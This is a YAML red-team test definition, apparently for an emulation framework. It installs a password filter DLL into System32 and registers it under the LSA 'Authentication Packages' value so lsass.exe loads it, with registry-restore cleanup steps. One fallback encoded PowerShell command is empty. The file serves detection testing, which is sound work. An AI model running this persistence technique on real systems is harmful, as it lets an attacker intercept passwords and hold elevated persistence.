- id: ffa4c418-7c38-5c06-a43e-3b0f4dc978b5
  name: Soumaia ART Tests - Install Additional Authentication Packages
  description: "lsass.exe loads all DLLs specified by the Authentication Packages REG_MULTI_SZ value.\nUses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup. (requires elevation)"
  tactic: persistence
  technique:
    attack_id: T1556.002
    name: 'Modify Authentication Process: Password Filter DLL'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGIAaQBuAFwAQQB0AG8AbQBpAGMAUgBlAGQAVABlAGEAbQBQAFcARgBpAGwAdABlAHIALgBkAGwAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ".\lsa_backup.reg"
          $passwordFilterName = (Copy-Item ".\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
          $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
          $AuthenticationPackagesValues = $lsaKey.GetValue("Authentication Packages")
          $AuthenticationPackagesValues += $passwordFilterName
          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Authentication Packages" $AuthenticationPackagesValues
        cleanup: |-
          reg.exe import ".\lsa_backup.reg"
          remove-item C:\Windows\System32\AtomicRedTeamPWFilter.dll
        payloads:
        - bin
        - lsa_backup.reg
